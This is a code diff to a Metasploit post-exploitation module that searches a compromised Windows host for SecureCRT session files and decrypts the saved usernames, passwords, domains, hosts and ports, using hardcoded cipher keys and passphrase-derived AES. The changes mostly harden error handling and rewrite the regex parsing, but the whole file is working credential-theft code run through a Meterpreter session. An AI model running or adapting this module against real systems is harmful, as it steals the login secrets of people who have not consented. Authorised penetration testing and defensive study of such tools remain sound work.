@@ -62,8 +62,13 @@ class MetasploitModule < Msf::Post
   def enum_session_file(path)
     config_ini = []
     tbl = []
-    print_status("Searching for session files in #{path}")
-    config_ini += session.fs.file.search(path, '*.ini')
+    begin
+      print_status("Searching for session files in #{path}")
+      config_ini += session.fs.file.search(path, '*.ini')
+      fail_with(Failure::BadConfig, "Couldn't find any session files at #{path}") if config_ini.empty?
+    rescue Rex::Post::Meterpreter::RequestError
+      fail_with(Failure::BadConfig, "The SecureCRT registry key on the target is likely misconfigured. The directory at #{path} is inaccessable or doesn't exist")
+    end
 
     # enum session file
     config_ini.each do |item|
@@ -73,25 +78,26 @@ class MetasploitModule < Msf::Post
         next
       end
 
-      file = try_encode_file(file_contents)
-      protocol = Regexp.compile('S:"Protocol Name"=([^\s]+)').match(file) ? Regexp.last_match(1) : nil
-      hostname = Regexp.compile('S:"Hostname"=([^\s]+)').match(file) ? Regexp.last_match(1) : nil
-      decrypted_script = Regexp.compile('S:"Login Script V3"=02:([0-9a-f]+)').match(file) ? securecrt_crypto_v2(Regexp.last_match(1)) : nil
+      file = try_encode_file(file_contents).force_encoding(Encoding::UTF_8)
+      protocol = file[/"Protocol Name"=(?<protocol>[^\s]+)/u, 'protocol']
+      hostname = file[/"Hostname"=(?<hostname>[^\s]+)/u, 'hostname']
+      decrypted_script = securecrt_crypto_v2(file[/"Login Script V3"=02:(?<script>[0-9a-f]+)/u, 'script'])
       if !decrypted_script.nil?
-        username = decrypted_script.match(/login name:\x1F(\S+)\x1F0\x1Fpass/u)[1]
-        password = decrypted_script.match(/password:\x1F([\S]+)\x1F0/u)[1]
-        domain = decrypted_script.match(/Windows Domain:\x1F([\S]+)\x1F/u) ? decrypted_script.match(/Windows Domain:\x1F([\S]+)\x1F/u)[1] : nil
-        if !domain.nil?
+        username = decrypted_script[/[l]*ogin(?: name)?:\x1F(?<login>\S+)\x1F(?:[\d])\x1F[p]*ass/u, 'login']
+        password = decrypted_script[/[p]*assword:\x1F(?<password>[\S]+)\x1F/u, 'password']
+        domain = decrypted_script[/[Ww]*indows [Dd]*omain:\x1F(?<domain>[\S]+)\x1F/u, 'domain']
+        if !domain.nil? && !username.nil?
           username = domain + '\\' + username
         end
       else
-        password = Regexp.compile('S:"Password"=u([0-9a-f]+)').match(file) ? securecrt_crypto(Regexp.last_match(1)) : nil
-        passwordv2 = Regexp.compile('S:"Password V2"=02:([0-9a-f]+)').match(file) ? securecrt_crypto_v2(Regexp.last_match(1)) : nil
-        username = Regexp.compile('S:"Username"=([^\s]+)').match(file) ? Regexp.last_match(1) : nil
+        password = securecrt_crypto(file[/"Password"=u(?<password>[0-9a-f]+)/u, 'password'])
+        passwordv2 = securecrt_crypto_v2(file[/"Password V2"=02:(?<passwordv2>[0-9a-f]+)/, 'passwordv2'])
+        username = file[/"Username"=(?<username>[^\s]+)/, 'username']
       end
 
-      port = Regexp.compile("D:\"\\\[#{protocol}\\\] Port\"=([0-9a-f]{8})").match(file) ? Regexp.last_match(1).to_i(16).to_s : nil
-      port = Regexp.compile('D:"Port"=([0-9a-f]{8})').match(file) ? Regexp.last_match(1).to_i(16).to_s : nil if !port
+      port = file[/#{protocol}\r\n\w:\"Port\"=(?<port>[0-9a-f]{8})/, 'port']&.to_i(16)&.to_s
+      port = file[/\[#{protocol}\] Port\"=(?<port>[0-9a-f]{8})/, 'port']&.to_i(16)&.to_s if port.nil?
+
 
       tbl << {
         file_name: item['name'],
@@ -106,6 +112,7 @@ class MetasploitModule < Msf::Post
   end
 
   def securecrt_crypto(ciphertext)
+    return nil if ciphertext.nil? || ciphertext.empty?
     key1 = "\x24\xA6\x3D\xDE\x5B\xD3\xB3\x82\x9C\x7E\x06\xF4\x08\x16\xAA\x07"
     key2 = "\x5F\xB0\x45\xA2\x94\x17\xD9\x16\xC6\xC6\xA2\xFF\x06\x41\x82\xB7"
     ciphered_bytes = [ciphertext].pack('H*')
@@ -121,6 +128,7 @@ class MetasploitModule < Msf::Post
   end
 
   def securecrt_crypto_v2(ciphertext)
+    return nil if ciphertext.nil? || ciphertext.empty?
     iv = ("\x00" * 16)
     config_passphrase = datastore['PASSPHRASE'] || nil
     key = OpenSSL::Digest::SHA256.new(config_passphrase).digest
@@ -182,7 +190,7 @@ class MetasploitModule < Msf::Post
     end
 
     if securecrt_path.to_s.empty?
-      print_error('Could not find the registry entry for the SecureCRT session path. Ensure that SecureCRT is installed on the target.')
+      fail_with(Failure::NotFound, 'Could not find the registry entry for the SecureCRT session path. Ensure that SecureCRT is installed on the target.')
     else
       result = enum_session_file(securecrt_path)
       columns = [
